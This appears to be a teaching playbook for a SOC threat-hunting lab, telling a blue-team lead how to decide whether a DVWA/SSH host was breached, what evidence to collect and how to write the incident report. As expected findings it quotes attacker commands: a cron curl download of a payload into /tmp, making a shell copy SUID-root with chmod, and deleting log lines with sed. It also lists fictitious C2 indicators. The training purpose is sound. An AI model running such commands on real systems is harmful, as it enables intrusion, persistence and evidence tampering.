# Class 11 — SOC Manager Investigation Playbook

**"Has web01 been attacked?" — how to answer it, and how to write it up.**

`ATTACK-MANUAL.md` is the red-team script. This document is the **blue-team lead's**
side: you have been handed CTI bulletin *TIN MAGPIE* and a server, and you have to
come back with a defensible yes/no, an evidence package, and a report. It is
written to the Class 11 lab (the DVWA + OpenSSH victim in `victim/`) but the
question set and the report template apply to any host triage.

> Ground truth for this lab lives in `README.md` → *Instructor answer key*. Use it
> to check your work **after** you have run the hunt cold.

---

## 0 · When this playbook runs

Kick it off when any of these lands on the desk:

- a CTI report naming infrastructure or TTPs and a "hunt your estate" ask (this lab),
- a sensor alert on the host (Suricata `ET SCAN`, Wazuh SSH brute rule, Zeek long-conn),
- an anomaly a human noticed (odd outbound traffic, a file nobody recognises, a box running hot),
- a third-party notification ("your IP is beaconing to our sinkhole").

Your job as SOC manager on this: **scope it, decide if it is an incident, contain
if it is, and produce the record.** You are not expected to do forensics on every
disk — you are expected to know which questions decide the call.

---

## 1 · The question set

Seven questions. Each one is a hypothesis you are trying to confirm or kill. Work
them in order — earlier answers change how hard you push on later ones.

For every question: **where to look on the live box**, **where to look in the
collected evidence** (`./work/`, built by `./collect.sh`), the **clean vs.
compromised signal**, and the **ATT&CK** technique it maps to.

### Q1 — Was the web application used to get a foothold?

| | |
|---|---|
| **Hypothesis** | An attacker uploaded a webshell through the DVWA file-upload page. |
| **ATT&CK** | T1190 (exploit public-facing app), T1505.003 (web shell) |
| **Live box** | `docker exec web01-dvwa ls -la --time-style=full-iso /var/www/html/hackable/uploads/` — anything that is not `.gitkeep`/an image, owned by `www-data`, with a recent mtime, is suspect. |
| **Evidence** | `yara -r rules/hunt_webshell.yar ./work/var/www/html/` — or `hunt.sh` step 1. |
| **In the logs** | `grep -E 'POST /vulnerabilities/upload/' ./work/var/log/syslog` then `grep -E 'GET /(hackable/)?uploads/.*\.php' ./work/var/log/syslog` |
| **Clean** | uploads dir holds only sample images; no `.php` under any web-writable path; no POST to the upload endpoint from an external IP. |
| **Compromised** | a `.php` file in `uploads/` that matches the YARA rule; a `POST /vulnerabilities/upload/` immediately followed by `GET .../uploads/<name>.php?c=...` from the same external IP. |
| **Lab truth** | `uploads/webshell.php` (or your `agent.php`/`cmd.php`), interacted with from `193.169.255.78`. |

### Q2 — Were credentials brute-forced or sprayed?

| | |
|---|---|
| **Hypothesis** | SSH was brute-forced from a single source before a successful login. |
| **ATT&CK** | T1110 (brute force) |
| **Live box** | `docker logs web01-ssh 2>&1 \| grep -Ei 'failed\|accepted'` |
| **Evidence** | `grep -E 'Failed password' ./work/var/log/syslog \| grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' \| sort \| uniq -c \| sort -rn` — one IP with dozens of failures is the spray. |
| **The pivot that matters** | is there an `Accepted password`/`Accepted publickey` from that **same IP** or shortly after the burst? That is the difference between "attempted" and "successful". |
| **Clean** | scattered failures from many IPs (internet background noise), no success correlated to a burst. |
| **Compromised** | a `Failed password` burst from one IP, then an `Accepted` line for a valid user. |
| **Lab truth** | `Failed password for root/admin from 45.153.160.140`; the working cred is `support/support`. |

### Q3 — Is the host talking to known-bad infrastructure?

| | |
|---|---|
| **Hypothesis** | The C2 IPs from the CTI bulletin already appear in our logs. |
| **ATT&CK** | T1071 (application-layer C2) |
| **Evidence** | `grep -rnF -f ./work/malicious_ips.txt ./work/var/log/` **and** `zgrep -HnF -f ./work/malicious_ips.txt ./work/var/log/archive/*.gz` — or `hunt.sh` step 2. |
| **Why the archive matters** | an attacker who cleans the live log (Q7) cannot pull back what already rotated to `*.1` / `*.gz` or already shipped to the SIEM. Always sweep the archives. |
| **Clean** | no CTI indicator appears in any log, live or archived. Record it: *"swept web01 logs for TIN MAGPIE IP list, 0 hits, <date>."* |
| **Compromised** | any bulletin IP in `auth.log` (inbound brute) or web logs (webshell GETs) or `conn.log` (outbound). |
| **Lab truth** | `45.153.160.140` (SSH brute), `193.169.255.78` (webshell interaction), `5.42.92.211` (second-stage pull). |

### Q4 — Is there C2 beaconing?

| | |
|---|---|
| **Hypothesis** | A loader is beaconing on a fixed long interval with tiny payloads. |
| **ATT&CK** | T1071.001 (web protocols), T1573 (encrypted channel) |
| **Evidence** | `zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes < ./work/zeek/conn.log \| sort -k4 -nr \| head` — or `hunt.sh` step 3. |
| **What a beacon looks like** | same `src -> dst:port` repeating, near-constant small byte counts each way, roughly even spacing (≈3600 s here). IPs rotate between campaigns; **this shape does not** — it is the durable detection. |
| **Clean** | long connections are explainable (backup window, DB replication, a monitoring agent to a known host). |
| **Compromised** | 3+ sessions, one internal host → one external IP:443, ~1 h each, <1 KB transferred. |
| **Lab truth** | `10.0.0.5 -> 45.153.160.140:443`, 3× ~3600 s, ~500 B. |

### Q5 — Did the attacker pull a second stage?

| | |
|---|---|
| **Hypothesis** | After the foothold, the host fetched an implant from an external server. |
| **ATT&CK** | T1105 (ingress tool transfer) |
| **Live box** | `docker exec web01-dvwa sh -c 'ls -la /dev/shm /tmp'` — look for executables, hidden names, ELF headers (`file /dev/shm/*`). |
| **Evidence** | `grep -E '(curl\|wget).*(http\|ftp)' ./work/var/log/syslog` — victim-initiated downloads to an unusual host:port. |
| **Network corroboration** | Zeek `http.log` / `files.log` showing `application/x-executable` (an ELF) delivered over HTTP; Suricata ET hit on the fetch. |
| **Clean** | no outbound `curl`/`wget` from service accounts; `/dev/shm` and `/tmp` hold only expected runtime files. |
| **Compromised** | `www-data` or `support` running `curl http://<ip>/<name> -o /dev/shm/.u` then `chmod +x`. |
| **Lab truth** | `CRON[...] (www-data) CMD (curl -s http://5.42.92.211/win/update.hta -o /tmp/.u)` and `/dev/shm/.u`. |

### Q6 — Is there persistence?

| | |
|---|---|
| **Hypothesis** | The attacker planted at least one mechanism to survive a reboot / session loss. |
| **ATT&CK** | T1548.001 (SUID), T1053 (cron), T1543 (systemd service), T1098 (SSH keys) |
| **SUID** | `find ./work -type f -perm -04000 -exec ls -l {} +` — or `hunt.sh` step 4. A SUID-root binary with a hidden (dot-prefixed) name, or a `dash`/`bash` copy anywhere outside `/bin`, is persistence. |
| **Memory-staged exec** | `find ./work/dev/shm ./work/tmp -type f -perm -111 -exec ls -l {} +` — or `hunt.sh` step 5. |
| **Live-box checks not in `./work/`** | `docker exec web01-ssh sh -c 'crontab -l; ls -la /etc/cron.d /etc/systemd/system; cat ~/.ssh/authorized_keys'` — new cron entries, a `soc-update.service`-style unit pointing at `/dev/shm`, an unexplained key appended to `authorized_keys`. |
| **Clean** | SUID set matches a distro baseline; no exec in `/dev/shm`; no unexpected cron/units/keys. |
| **Compromised** | any of: `opt/bin/.helper` (SUID root shell copy), `/dev/shm/.u`, a cron beacon, `soc-update.service`, an extra `authorized_keys` line. |
| **Lab truth** | `opt/bin/.helper` and `/dev/shm/.u`; ATTACK-MANUAL stage 6 also adds cron + systemd + an SSH key. |

### Q7 — Was evidence tampered with?

| | |
|---|---|
| **Hypothesis** | The attacker tried to cover their tracks. |
| **ATT&CK** | T1070 (indicator removal) |
| **Signals** | gaps in otherwise-continuous log sequences; a live log that is *shorter* than its own `.1` archive for the same window; files timestomped to match `/bin/ls` exactly; `HISTFILE` unset / `history -c`; `auth.log` missing lines that the archived copy still has. |
| **How you catch it anyway** | Q3's archive/`zgrep` sweep, plus anything already in the SIEM/Zeek. The lesson: **you cannot un-ship telemetry.** |
| **Clean** | live and archived logs agree; file mtimes are plausibly staggered. |
| **Compromised** | archived `syslog.1` contains `45.153.160.140` brute-force lines that the live `syslog` no longer has. |
| **Lab truth** | ATTACK-MANUAL stage 8 does `sed -i '/45.153.160.140/d' /var/log/auth.log`; `collect.sh` keeps `archive/syslog.1` + `.2.gz` so `hunt.sh` step 2 still lands. |

---

## 2 · Making the call

Run all seven, then classify. As SOC manager you own this decision.

| Finding pattern | Call | Why |
|---|---|---|
| 0/7 confirmed, archives swept | **Not an incident.** Log a negative hunt result with the date and scope. | Documented "checked, clean" is a valid outcome. |
| Recon / brute **attempts only**, no success, no artifacts | **Event, not incident.** Tune the alert, note it. | Adversary knocked, did not get in. |
| Q1 or Q2 confirmed a foothold **and** any of Q3–Q7 confirmed | **Confirmed incident. Declare it.** | Foothold + post-exploitation = active intrusion. |
| Q6 (persistence) or Q4 (beacon) confirmed | **Confirmed incident, treat as active.** | Attacker still has a way back / a live channel. |
| Signals conflict or evidence is thin | **Suspected incident.** Preserve, escalate for deeper forensics. | Don't guess — get the disk image. |

**Severity** (adjust to your org): webshell on an internet-facing host with
outbound C2 = High/Critical. Brute-force attempts with no success = Low. A single
hidden SUID with no other corroboration = Medium pending confirmation.

---

## 3 · Build the timeline

Before you write anything, put every confirmed event on one clock. Normalise
timezones first (this lab's nginx logs are `+0600`).

```
T0   <recon>            first ET SCAN / 404 storm from <attacker IP>
T1   <credential access> Failed password burst from 45.153.160.140
T2   <initial access>    POST /vulnerabilities/upload/  -> uploads/<shell>.php
T3   <execution>         GET /uploads/<shell>.php?c=...  from 193.169.255.78
T4   <ingress transfer>  curl http://5.42.92.211/... -o /dev/shm/.u
T5   <persistence>       chmod 4755 /opt/.helper ; cron/systemd added
T6   <C2>                first 10.0.0.5 -> 45.153.160.140:443 long session
T7   <evasion>           auth.log lines deleted (caught via archive)
```

The timeline is what turns seven separate findings into one narrative — and it is
the first thing a reviewer or an auditor reads.

---

## 4 · Evidence handling

Do this **before** you contain — containment changes the box.

- Run `./collect.sh` (lab) or, on a real host, `scp` `/var/log/*`, the web root,
  and `crontab`/systemd/`~/.ssh` state into a working dir in the same layout.
- Hash everything you pull: `find ./work -type f -exec sha256sum {} + > work.sha256`.
- Note **who** collected it, **when** (UTC), **from where** (hostname, container ID,
  IP), and **how** (command used). That is your chain of custody.
- Keep the collected copy read-only. Hunt against the copy, never the live box.
- Screenshot / save the raw tool output (`hunt.sh -s | tee hunt_$(date -u +%Y%m%dT%H%M%SZ).log`).
- If you may prosecute or involve legal: stop, image the disk, hand off.

---

## 5 · Containment — the SOC manager's decisions

You decide *whether* and *when*. Typical options, fastest to most disruptive:

| Action | Use when | Cost |
|---|---|---|
| Block C2 IPs egress at the firewall | beacon confirmed, want to keep the box up for observation | low; tips the attacker |
| Kill the webshell / implant, pull the SUID + cron + key | foothold confirmed, single host, low reinfection risk | medium; destroys volatile evidence — collect first |
| Isolate host (host-only network / security group) | active intrusion, multiple artifacts, spread unknown | medium; service outage |
| Rotate every credential the box could touch | any confirmed foothold on a host with stored creds/keys | high effort, non-negotiable |
| Rebuild from known-good, restore data only | persistence confirmed or root compromise suspected | highest; the only way to be sure |

For this lab: `./victim/run.sh clean && ./victim/run.sh` is the "rebuild". In
production, assume one webshell means the whole host is untrusted.

---

## 6 · Incident report template

Fill this in and file it. This is the deliverable.

```markdown
# Incident Report — <ID> — web01 compromise

**Status:** Confirmed / Suspected / Not an incident
**Severity:** Critical / High / Medium / Low
**Reported by:** <source>            **Date opened (UTC):** <ts>
**Investigator:** <name>             **SOC manager:** <name>

## 1. Summary
<3–4 sentences: what happened, how the attacker got in, what they did,
current status. Lead with the answer.>

## 2. Scope
- Affected host(s): web01 (<ip>, container web01-dvwa / web01-ssh)
- Services exposed: DVWA :8080, OpenSSH :2222
- Data/credentials reachable from the host: <list>
- Evidence of lateral movement: <yes/no + detail>

## 3. Timeline (UTC)
| Time | Event | Evidence | ATT&CK |
|------|-------|----------|--------|
| | | | |

## 4. Findings
| # | Question | Result | Evidence (file:line) | ATT&CK |
|---|----------|--------|----------------------|--------|
| Q1 | Web foothold | | | T1190 / T1505.003 |
| Q2 | Credential brute force | | | T1110 |
| Q3 | Known-bad infra in logs | | | T1071 |
| Q4 | C2 beaconing | | | T1071.001 / T1573 |
| Q5 | Second-stage transfer | | | T1105 |
| Q6 | Persistence | | | T1548.001 / T1053 / T1543 / T1098 |
| Q7 | Anti-forensics | | | T1070 |

## 5. Indicators observed
| Type | Value | Context | First seen | Source |
|------|-------|---------|-----------|--------|
| IPv4 | 45.153.160.140 | SSH brute + C2 :443 | | auth.log / conn.log |
| IPv4 | 193.169.255.78 | webshell interaction | | web log |
| IPv4 | 5.42.92.211 | second-stage host | | cron |
| file | uploads/webshell.php | PHP webshell | | YARA |
| file | /opt/.helper | SUID-root shell copy | | find -perm -4000 |
| file | /dev/shm/.u | staged downloader | | find /dev/shm |

## 6. Root cause
<the actual entry vector: DVWA unauthenticated file upload + weak SSH creds>

## 7. Containment & eradication
| Action | Owner | Done (UTC) |
|--------|-------|-----------|

## 8. Recommendations
- <fix the upload validation / remove DVWA from the edge>
- <enforce SSH key-only auth, fail2ban, no password login>
- <egress filtering to break beaconing>
- <FIM/auditd on web roots, /etc/cron*, /etc/systemd, ~/.ssh>

## 9. Detections created / tuned
| Finding | Detection | Type | Status |
|---------|-----------|------|--------|
| Q4 beacon | long-duration low-byte outbound SSL | Sigma | drafted |
| Q1 webshell | new .php in uploads dir + eval/base64 | Sigma / YARA | |
| Q2 brute | >N Failed password from one IP in <window> | SIEM correlation | |

## 10. Lessons learned
<what the sensors missed, what slowed the hunt, what to change>
```

---

## 7 · Close the loop

An investigation that ends without one of these two outcomes is not finished:

1. **New or tuned detection** — the durable pattern from a finding, shipped to the
   SIEM. The Q4 beacon is the best candidate here (behaviour outlasts IPs); hand it
   to Class 06 detection engineering as a Sigma rule.
2. **Documented negative** — *"Hunted web01 for TIN MAGPIE TTPs across Q1–Q7,
   including archived logs. No indicators found. Scope: single host, logs
   2026-08-01 to date. Checked by <name>, <UTC>."*

Then enrich the confirmed IOCs (VirusTotal / OTX / URLhaus / your MISP), record
their confidence and expiry, and feed them back to the CTI function.

---

## Appendix A — one-shot triage

```bash
# from labs/class-11-threat-hunting/  (victim must be up: ./victim/run.sh)
./collect.sh                                   # build ./work from the live box
find ./work -type f -exec sha256sum {} + > work.sha256
./hunt.sh -s | tee hunt_$(date -u +%Y%m%dT%H%M%SZ).log

# spot checks the hunt does not cover
docker exec web01-dvwa ls -la --time-style=full-iso /var/www/html/hackable/uploads/
docker exec web01-ssh  sh -c 'crontab -l; ls -la /etc/systemd/system; cat ~/.ssh/authorized_keys'
docker logs web01-ssh 2>&1 | grep -Ei 'failed|accepted' | tail -40
```

## Appendix B — `hunt.sh` step → question map

| `hunt.sh` step | Playbook question |
|---|---|
| 1 Webshell primitives (YARA) | Q1 |
| 2 Known-bad IPs in logs (`grep`/`zgrep`) | Q3 (and evidence for Q2, Q7) |
| 3 Long-duration low-byte sessions | Q4 |
| 4 Anomalous SUID/SGID | Q6 |
| 5 Executables in `/dev/shm`, `/tmp` | Q5 + Q6 |
| 6 Extract IOCs from the CTI report | feeds Q3 and *§7 close the loop* |

## Appendix C — TIN MAGPIE indicators (from `scenario/apt_report.txt`)

| Type | Value |
|------|-------|
| C2 IPv4 | `45.153.160.140`, `193.169.255.78` |
| Staging | `185.220.101.5` |
| Payload URL | `hxxp://5.42.92.211/win/update.hta` |
| Domains | `evil-c2[.]com`, `update-check[.]net` |
| MD5 | `9f1c8d2e5b4a3c6f7e0d1a2b3c4d5e6f` |
| SHA256 | `d41d8cd98f00b204e9800998ecf8427ee3b0c44298fc1c149afbf4c8996fb924` |
| CVE | `CVE-2024-3400`, `CVE-2023-38831` |

> Lab indicators are fictitious. Do not submit them to production intel platforms.
